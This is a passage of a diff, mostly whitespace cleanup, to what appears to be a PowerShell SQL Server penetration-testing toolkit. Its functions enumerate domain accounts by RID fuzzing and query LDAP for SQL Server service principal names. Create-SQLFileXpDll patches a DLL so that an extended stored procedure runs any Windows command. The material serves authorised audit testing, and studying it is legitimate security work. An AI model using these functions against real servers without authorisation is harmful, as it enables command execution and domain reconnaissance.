+            $PrincipalIDHexPad1 = $PrincipalIDHex | Measure-Object -Character
             $PrincipalIDHexPad2 = $PrincipalIDHexPad1.Characters
 
             # Check if number is even and fix leading 0 if needed
@@ -7883,7 +7888,7 @@ Function  Get-SQLFuzzDomainAccount
                 $PrincipalIDHexFix = "0$PrincipalIDHex"
             }
 
-            # Reverse the order of the hex   
+            # Reverse the order of the hex
             $GroupsOfTwo = $PrincipalIDHexFix -split '(..)' | Where-Object -FilterScript {
                 $_
             }
@@ -7893,18 +7898,18 @@ Function  Get-SQLFuzzDomainAccount
             # Pad to 8 bytes
             $PrincipalIDPad = $PrincipalIDHexFix2.PadRight(8,'0')
 
-            # Create users rid  
-            $Rid = "0x$DomainGroupSidString$PrincipalIDPad"  
+            # Create users rid
+            $Rid = "0x$DomainGroupSidString$PrincipalIDPad"
 
             # Define Query
             $Query = "SELECT    '$ComputerName' as [ComputerName],
                 '$Instance' as [Instance],
-                '$Rid' as [RID], 
+                '$Rid' as [RID],
             SUSER_SNAME($Rid) as [DomainAccount]"
-                                        
+
             # Execute Query
-            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose  
-            
+            $TblResults = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
+
             $DomainAccount = $TblResults.DomainAccount
             if($DomainAccount.length -ge 2)
             {
@@ -7920,14 +7925,14 @@ Function  Get-SQLFuzzDomainAccount
                     Write-Verbose -Message "$Instance : - RID $Rid ($_) resolved to: "
                 }
             }
-        
+
             # Append results
-            $TblFuzzedAccounts = $TblFuzzedAccounts + $TblResults              
-        }          
+            $TblFuzzedAccounts = $TblFuzzedAccounts + $TblResults
+        }
     }
 
     End
-    {  
+    {
         # Return data
         $TblFuzzedAccounts |
         Select-Object -Property ComputerName, Instance, DomainAccount -Unique |
@@ -7946,22 +7951,22 @@ Function Get-ComputerNameFromInstance
 {
     <#
             .SYNOPSIS
-            Parses computer name from a provided instance. 
+            Parses computer name from a provided instance.
             .PARAMETER Instance
-            SQL Server instance to parse. 
+            SQL Server instance to parse.
             .EXAMPLE
             PS C:\> Get-ComputerNameFromInstance -Instance SQLServer1\STANDARDDEV2014
             SQLServer1
     #>
     [CmdletBinding()]
-    Param(          
+    Param(
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SQL Server instance.')]
         [string]$Instance
     )
-        
+
     # Parse ComputerName from provided instance
     If ($Instance)
     {
@@ -7970,8 +7975,8 @@ Function Get-ComputerNameFromInstance
     else
     {
         $ComputerName = $env:COMPUTERNAME
-    }            
-    
+    }
+
     Return $ComputerName
 }
 
@@ -7980,16 +7985,16 @@ Function Get-ComputerNameFromInstance
 # Function:  Get-SQLServiceLocal
 # -------------------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLServiceLocal 
+Function  Get-SQLServiceLocal
 {
     <#
             .SYNOPSIS
-            Returns local SQL Server services using Get-WmiObject -Class win32_service. This can only be run against the local server. 
+            Returns local SQL Server services using Get-WmiObject -Class win32_service. This can only be run against the local server.
             .EXAMPLE
             PS C:\> Get-SQLServiceLocal | Format-Table -AutoSize
 
-            ComputerName   ServiceDisplayName                                     ServiceName                              ServicePath                                                
-            ------------   ------------------                                     -----------                              -----------                                                
+            ComputerName   ServiceDisplayName                                     ServiceName                              ServicePath
+            ------------   ------------------                                     -----------                              -----------
             SQLServer1     SQL Server Integration Services 12.0                   MsDtsServer120                           "C:\Program Files\Microsoft SQL Server\120\DTS\Binn\MsDt...
             SQLServer1     SQL Server Analysis Services (STANDARDDEV2014)         MSOLAP$STANDARDDEV2014                   "C:\Program Files\Microsoft SQL Server\MSAS12.STANDARDDE...
             SQLServer1     SQL Server (SQLEXPRESS)                                MSSQL$SQLEXPRESS                         "C:\Program Files\Microsoft SQL Server\MSSQL12.SQLEXPRES...
@@ -8023,15 +8028,15 @@ Function  Get-SQLServiceLocal
     }
 
     Process
-    {       
+    {
         # Grab SQL Server services based on file path
         $SqlServices = Get-WmiObject -Class win32_service |
         Where-Object -FilterScript {
             $_.pathname -like '*Microsoft SQL Server*'
         } |
         Select-Object -Property DisplayName, PathName, Name, StartName, State, SystemName
-       
-        # Add recrds to SQL Server instance table        
+
+        # Add recrds to SQL Server instance table
         $SqlServices |
         ForEach-Object -Process {
             $null = $TblLocalInstances.Rows.Add(
@@ -8040,18 +8045,18 @@ Function  Get-SQLServiceLocal
                 [string]$_.Name,
                 [string]$_.PathName,
                 [string]$_.StartName,
-            [string]$_.State)                  
+            [string]$_.State)
         }
     }
 
     End
-    {  
-        
+    {
+
         # Status User
         $LocalInstanceCount = $TblLocalInstances.rows.count
 
         # Return data
-        $TblLocalInstances         
+        $TblLocalInstances
     }
 }
 
@@ -8063,26 +8068,26 @@ function Create-SQLFileXpDll
 {
     <#
             .SYNOPSIS
-            This script can be used to generate a DLL file with an exported function that can be registered as an 
-            extended stored procedure in SQL Server.  The exported function can be configured to run any 
+            This script can be used to generate a DLL file with an exported function that can be registered as an
+            extended stored procedure in SQL Server.  The exported function can be configured to run any
             Windows command.  This script is intended to be used to test basic SQL Server audit controls around
-            the sp_addextendedproc and sp_dropextendedproc stored procedures used to register and unregister 
+            the sp_addextendedproc and sp_dropextendedproc stored procedures used to register and unregister
             extended stored procedures.
             .PARAMETER ExportName
-            Name of the exported function that will be created.    
+            Name of the exported function that will be created.
             .PARAMETER Command
-            Operating system command that the exported function will run.   
+            Operating system command that the exported function will run.
             .PARAMETER OutFile
-            Name of the Dll file to write to. 
+            Name of the Dll file to write to.
             .EXAMPLE
             PS C:\temp> Create-SQLFileXpDll -OutFile c:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
- 
+
             Creating DLL c:\temp\test.dll
             - Exported function name: xp_test
             - Exported function command: "echo test > c:\temp\test.txt"
             - DLL written
             - Manual test: rundll32 c:\temp\test.dll,xp_test
- 
+
             SQL Server Notes
             The exported function can be registered as a SQL Server extended stored procedure. Options below:
             - Register xp via local disk: sp_addextendedproc 'xp_test', 'c:\temp\myxp.dll'
@@ -8098,7 +8103,7 @@ function Create-SQLFileXpDll
 
             Modified source code used to create the DLL can be found at the link below:
             https://github.com/nullbind/Powershellery/blob/master/Stable-ish/MSSQL/xp_evil_template.cpp
-	    
+
             The method used to patch the DLL was based on Will Schroeder "Invoke-PatchDll" function found in the PowerUp toolkit:
             https://github.com/HarmJ0y/PowerUp
     #>
@@ -8133,7 +8138,7 @@ function Create-SQLFileXpDll
     $BufferString = 'REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!REPLACEME!'
 
     # -----------------------------------------------
-    # Setup command 
+    # Setup command
     # -----------------------------------------------
 
     # Command to injectin into the DLL (if not defined by the user)
@@ -8165,7 +8170,7 @@ function Create-SQLFileXpDll
         $CommandString = "$CommandString && REM $NewBuffer"
     }
 
-    # Convert command string 
+    # Convert command string
     $CommandStringBytes = ([system.Text.Encoding]::UTF8).GetBytes($CommandString)
 
     # Get string value of the DLL file
@@ -8202,7 +8207,7 @@ function Create-SQLFileXpDll
     IF(-not($ExportName))
     {
         $ExportName = 'xp_evil'
-    }        
+    }
 
     # Check function name length
     $ProcNameBufferLen = $ProcNameBuffer.Length
@@ -8221,12 +8226,12 @@ function Create-SQLFileXpDll
 
     # Get function name string offset
     $ProcIndex = 0
-        
+
     # Get string value of the DLL file
     $S2 = [System.Text.Encoding]::ASCII.GetString($DllBytes)
 
     $ProcIndex = $S2.IndexOf($ProcNameBuffer)
-        
+
     # Check for offset errors
     if(($ProcIndex -eq 0) -and ($ProcIndex -ne -1))
     {
@@ -8249,10 +8254,10 @@ function Create-SQLFileXpDll
 
     # Get offset for nulls
     $NullOffset = $ProcIndex+$ExportNameLen
-    Write-Information -MessageData " Found buffer offset for buffer: $NullOffset"        
-    $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($ProcNewBuffer) 
-        
-    # Replace target bytes         
+    Write-Information -MessageData " Found buffer offset for buffer: $NullOffset"
+    $NullBytes = ([system.Text.Encoding]::UTF8).GetBytes($ProcNewBuffer)
+
+    # Replace target bytes
     for ($i = 0; $i -lt $ProcBuffLenDiff; $i++)
     {
         $DllBytes[$NullOffset+$i] = $NullBytes[$i]
@@ -8269,7 +8274,7 @@ function Create-SQLFileXpDll
 
     Write-Verbose -Message "Creating DLL $OutFile"
     Write-Verbose -Message " - Exported function name: $ExportName"
-    Write-Verbose -Message " - Exported function command: `"$Command`""        
+    Write-Verbose -Message " - Exported function command: `"$Command`""
     Write-Verbose -Message " - Manual test: rundll32 $OutFile,$ExportName"
     Set-Content -Value $DllBytes -Encoding Byte -Path $OutFile
     Write-Verbose -Message ' - DLL written'
@@ -8277,7 +8282,7 @@ function Create-SQLFileXpDll
     Write-Verbose -Message ' '
     Write-Verbose -Message 'SQL Server Notes'
     Write-Verbose -Message 'The exported function can be registered as a SQL Server extended stored procedure. Options below:'
-    Write-Verbose -Message " - Register xp via local disk: sp_addextendedproc `'$ExportName`', 'c:\temp\myxp.dll'"	    
+    Write-Verbose -Message " - Register xp via local disk: sp_addextendedproc `'$ExportName`', 'c:\temp\myxp.dll'"
     Write-Verbose -Message " - Register xp via UNC path: sp_addextendedproc `'$ExportName`', `'\\servername\pathtofile\myxp.dll`'"
     Write-Verbose -Message " - Unregister xp: sp_dropextendedproc `'$ExportName`'"
 }
@@ -8301,19 +8306,19 @@ function Get-DomainSpn
             Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
             Note: This will use the default logon server by default.
             .PARAMETER Username
-            Domain account to authenticate to Active Directory.   
+            Domain account to authenticate to Active Directory.
             .PARAMETER Password
-            Domain password to authenticate to Active Directory. 
+            Domain password to authenticate to Active Directory.
             .PARAMETER Credential
-            Domain credential to authenticate to Active Directory. 
+            Domain credential to authenticate to Active Directory.
             .PARAMETER DomainController
             Domain controller to authenticated to. Requires username/password or credential.
             .PARAMETER ComputerName
-            Computer name to filter for. 
+            Computer name to filter for.
             .PARAMETER DomainAccount
-            Domain account to filter for. 
+            Domain account to filter for.
             .PARAMETER SpnService
-            SPN service code to filter for. 
+            SPN service code to filter for.
             .EXAMPLE
             PS C:\temp> Get-DomainSpn -SpnService MSSQL | Select-Object -First 2
 
@@ -8335,7 +8340,7 @@ function Get-DomainSpn
             LastLogon    : 3/26/2016 3:43 PM
             Description  : This is a SQL Server test instance using a domain service account.
             .EXAMPLE
-            PS C:\temp> Get-DomainSpn -DomainController 10.0.0.1  -Username Domain\User -Password Password123!       
+            PS C:\temp> Get-DomainSpn -DomainController 10.0.0.1  -Username Domain\User -Password Password123!
     #>
     [CmdletBinding()]
     Param(
@@ -8351,24 +8356,24 @@ function Get-DomainSpn
         HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
         [string]$DomainController,
 
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Computer name to filter for.')]
         [string]$ComputerName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Domain account to filter for.')]
         [string]$DomainAccount,
 
-        [Parameter(Mandatory = $false,        
-        ValueFromPipelineByPropertyName = $true,
+        [Parameter(Mandatory = $false,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'SPN service code.')]
         [string]$SpnService,
 
@@ -8424,7 +8429,7 @@ function Get-DomainSpn
                 [string]$SidBytes = [byte[]]"$($_.Properties.objectsid)".split(' ')
                 [string]$SidString = $SidBytes -replace ' ', ''
                 $Spn = $_.properties.serviceprincipalname.split(',')
-                           
+
                 foreach ($item in $Spn)
                 {
                     # Parse SPNs
@@ -8447,7 +8452,7 @@ function Get-DomainSpn
                         [string]$_.properties.samaccountname,
                         [string]$_.properties.cn,
                         [string]$SpnService,
-                        [string]$SpnServer, 
+                        [string]$SpnServer,
                         [string]$item,
                         $LastLogon,
                         [string]$_.properties.description
@@ -8473,7 +8478,7 @@ function Get-DomainSpn
             {
                 Write-Verbose -Message "$TableDomainSpnCount SPNs found on servers that matched search criteria."
             }
-            Return $TableDomainSpn 
+            Return $TableDomainSpn
         }
         else
         {
@@ -8495,25 +8500,25 @@ function Get-DomainObject
             Used to query domain controllers via LDAP. Supports alternative credentials from non-domain system
             Note: This will use the default logon server by default.
             .PARAMETER Username
-            Domain account to authenticate to Active Directory.   
+            Domain account to authenticate to Active Directory.
             .PARAMETER Password
-            Domain password to authenticate to Active Directory. 
+            Domain password to authenticate to Active Directory.
             .PARAMETER Credential
-            Domain credential to authenticate to Active Directory. 
+            Domain credential to authenticate to Active Directory.
             .PARAMETER DomainController
             Domain controller to authenticated to. Requires username/password or credential.
             .PARAMETER LdapFilter
-            LDAP filter. 
+            LDAP filter.
             .PARAMETER LdapPath
-            Ldap path. 
-            .PARAMETER $Limit 
-            Maximum number of Objects to pull from AD, limit is 1,000.". 
-            .PARAMETER SearchScope 
-            Scope of a search as either a base, one-level, or subtree search, default is subtree.. 
+            Ldap path.
+            .PARAMETER $Limit
+            Maximum number of Objects to pull from AD, limit is 1,000.".
+            .PARAMETER SearchScope
+            Scope of a search as either a base, one-level, or subtree search, default is subtree..
             .EXAMPLE
-            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" 
+            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))"
             .EXAMPLE
-            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!       
+            PS C:\temp> Get-DomainObject -LdapFilter "(&(servicePrincipalName=*))" -DomainController 10.0.0.1  -Username Domain\User  -Password Password123!
             .Note
             This was based on Will Schroeder's Get-ADObject function from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
     #>
@@ -8531,7 +8536,7 @@ function Get-DomainObject
         HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
         [string]$DomainController,
@@ -8559,14 +8564,14 @@ function Get-DomainObject
         if($Username -and $Password)
         {
             $secpass = ConvertTo-SecureString $Password -AsPlainText -Force
-            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)                
-        }        
+            $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ($Username, $secpass)
+        }
 
-        # Create Create the connection to LDAP       
+        # Create Create the connection to LDAP
         if ($DomainController)
         {
             $objDomain = (New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password).distinguishedname
-            
+
             # add ldap path
             if($LdapPath)
             {
@@ -8577,13 +8582,13 @@ function Get-DomainObject
             {
                 $objDomainPath = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList "LDAP://$DomainController", $Credential.UserName, $Credential.GetNetworkCredential().Password
             }
-            
+
             $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
         }
         else
         {
             $objDomain = ([ADSI]'').distinguishedName
-            
+
             # add ldap path
             if($LdapPath)
             {
@@ -8594,7 +8599,7 @@ function Get-DomainObject
             {
                 $objDomainPath  = [ADSI]''
             }
-              
+
             $objSearcher = New-Object -TypeName System.DirectoryServices.DirectorySearcher -ArgumentList $objDomainPath
         }
 
@@ -8605,7 +8610,7 @@ function Get-DomainObject
     }
 
     Process
-    {        
+    {
         try
         {
             # Return object
@@ -8618,7 +8623,7 @@ function Get-DomainObject
             "Error was $_"
             $line = $_.InvocationInfo.ScriptLineNumber
             "Error was in Line $line"
-        }                
+        }
     }
 
     End
@@ -8630,11 +8635,11 @@ function Get-DomainObject
 # Function:  Get-SQLInstanceDomain
 # -------------------------------------------
 # Author: Scott Sutherland
-Function  Get-SQLInstanceDomain 
+Function  Get-SQLInstanceDomain
 {
     <#
             .SYNOPSIS
-            Returns a list of SQL Server instances discovered by querying a domain controller for systems with registered MSSQL service principal names.  
+            Returns a list of SQL Server instances discovered by querying a domain controller for systems with registered MSSQL service principal names.
             The function will default to the current user's domain and logon server, but an alternative domain controller can be provided.
             UDP scanning of management servers is optional.
             .PARAMETER Username
@@ -8670,7 +8675,7 @@ Function  Get-SQLInstanceDomain
             LastLogon        : 6/22/2016 9:00 AM
             [TRUNCATED]
             .EXAMPLE
-            PS C:\> Get-SQLInstanceDomain -Verbose -CheckMgmt 
+            PS C:\> Get-SQLInstanceDomain -Verbose -CheckMgmt
             PS C:\> Get-SQLInstanceDomain -Verbose
             VERBOSE: Grabbing SQL Server SPNs from domain...
             VERBOSE: Getting domain SPNs...
@@ -8690,7 +8695,7 @@ Function  Get-SQLInstanceDomain
             Service          : MSSQLSvc
             Spn              : MSSQLSvc/SQLServer1.domain.com
             LastLogon        : 6/22/2016 9:00 AM
-            [TRUNCATED]        
+            [TRUNCATED]
             .EXAMPLE
             PS C:\> Get-SQLInstanceDomain -DomainController 10.10.10.1 -Username domain\user -Password SecretPassword123!
             VERBOSE: Grabbing SQL Server SPNs from domain...
@@ -8708,7 +8713,7 @@ Function  Get-SQLInstanceDomain
             LastLogon        : 6/22/2016 9:00 AM
             [TRUNCATED]
 
-                
+
     #>
     [CmdletBinding()]
     Param(
@@ -8724,30 +8729,30 @@ Function  Get-SQLInstanceDomain
         HelpMessage = 'Credentials to use when connecting to a Domain Controller.')]
         [System.Management.Automation.PSCredential]
         [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,
-        
+
         [Parameter(Mandatory = $false,
         HelpMessage = 'Domain controller for Domain and Site that you want to query against.')]
         [string]$DomainController,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
-        ValueFromPipelineByPropertyName = $true,
+                ValueFromPipeline = $true,
+                ValueFromPipelineByPropertyName = $true,
         HelpMessage = 'Computer name to filter for.')]
         [string]$ComputerName,
 
         [Parameter(Mandatory = $false,
-        ValueFromPipeline = $true,
